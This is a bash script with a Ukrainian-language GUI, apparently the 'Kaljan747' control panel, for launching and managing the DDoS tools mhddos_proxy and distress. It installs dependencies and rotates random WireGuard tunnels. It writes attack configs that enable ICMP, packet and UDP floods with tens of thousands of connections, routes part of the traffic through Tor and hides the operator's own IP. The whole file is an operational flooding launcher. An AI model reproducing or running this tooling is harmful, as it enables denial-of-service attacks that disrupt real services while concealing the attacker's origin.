#!/bin/bash

set -e

# === Перевірка sudo ===
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
    else
        zenity --error --text="sudo не знайдено. Встановіть або увійдіть як root."; exit 1
    fi
fi

# === Встановлення залежностей ===
if command -v apt >/dev/null 2>&1; then
    $SUDO apt update -y
    $SUDO apt install -y curl wget git screen sed wireguard zenity x11-utils xterm htop iftop tmux
elif command -v dnf >/dev/null 2>&1; then
    $SUDO dnf install -y curl wget git screen sed wireguard-tools zenity xterm htop iftop tmux
elif command -v yum >/dev/null 2>&1; then
    $SUDO yum install -y curl wget git screen sed wireguard-tools zenity xterm htop iftop tmux
elif command -v apk >/dev/null 2>&1; then
    $SUDO apk add curl wget git screen sed wireguard-tools zenity xterm htop iftop tmux
else
    zenity --error --text="Підтримуваний пакетний менеджер не знайдено."; exit 1
fi

MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

MODULE_NAME="mhddos"
MODULE="$MODULE_DIR/mhddos_proxy"
CONFIG_FILE="$MODULE_DIR/mhddos.ini"
RUN_MODE="screen у фоні"
MONITORING=1

launch_monitoring() {
    xterm -T "Kaljan747 Моніторинг" -bg black -fg white +sb -fa 'Monospace' -fs 11 -e "bash -c '
    tmux new-session -d \"htop\"
    tmux split-window -h \"iftop -i \\$(ip route | grep default | awk \\\"{print \\\\$5}\\\")\"
    tmux select-layout even-horizontal
    tmux attach
    '" &
}

launch_module() {
    case "$RUN_MODE" in
        "screen у фоні") screen -dmS "$MODULE_NAME" bash -c "$MODULE $(cat $CONFIG_FILE)" & ;;
        "screen відкрито") screen -S "$MODULE_NAME" bash -c "$MODULE $(cat $CONFIG_FILE)" & ;;
        "без screen") bash -c "$MODULE $(cat $CONFIG_FILE)" & ;;
    esac
    if [ "$MONITORING" -eq 1 ]; then
        launch_monitoring
    fi
}

stop_module() {
    screen -S "$MODULE_NAME" -X stuff "^C"
    sleep 2
    screen -S "$MODULE_NAME" -X quit
}

restart_wg_and_update_ini() {
    for iface in $(wg show interfaces 2>/dev/null); do
        $SUDO wg-quick down "$iface" || true
        $SUDO ip link delete "$iface" || true
    done

    WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
    WG_IFACES=()
    for conf in "${WG_FILES[@]}"; do
        IFACE_NAME=$(basename "$conf" .conf)
        $SUDO wg-quick up "$conf"
        WG_IFACES+=("$IFACE_NAME")
    done

    VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
    VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

    echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=********" > "$MODULE_DIR/mhddos.ini"
    echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=********" > "$MODULE_DIR/distress.ini"
}

# === Основний нескінченний цикл ===
while true; do
    USER_SELECTION=$(zenity --forms --title="Kaljan747 Пульт Управління" \
        --text="Виберіть параметри:" \
        --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
        --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
        --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
        --add-combo="Моніторинг" --combo-values="Показати|Приховати" \
        --add-combo="Перезапустити модуль?" --combo-values="Так|Ні" \
        --add-combo="Згорнути модуль?" --combo-values="Так|Ні" \
        --add-combo="Зупинити модуль?" --combo-values="Так|Ні" \
        --add-combo="Вийти?" --combo-values="Так|Ні")

    [ $? -ne 0 ] && exit 0

    IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE SELECTED_MONITOR RESTART_SCREEN DETACH_SCREEN STOP_SCREEN EXIT_SCRIPT <<< "$USER_SELECTION"

    if [ "$EXIT_SCRIPT" = "Так" ]; then
        exit 0
    fi

    if [ "$STOP_SCREEN" = "Так" ]; then
        stop_module
    fi

    if [ "$DETACH_SCREEN" = "Так" ]; then
        screen -S "$MODULE_NAME" -X detach
    fi

    if [ "$RESTART_SCREEN" = "Так" ]; then
        stop_module
        restart_wg_and_update_ini
    fi

    if [ "$SELECTED_MODULE" = "mhddos_proxy" ]; then
        MODULE_NAME="mhddos"
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
    else
        MODULE_NAME="distress"
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
    fi

    if [ "$EDIT_INI" = "Так" ]; then
        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
    fi

    RUN_MODE="$SELECTED_RUN_MODE"
    MONITORING=1
    [ "$SELECTED_MONITOR" = "Приховати" ] && MONITORING=0

    launch_module

done
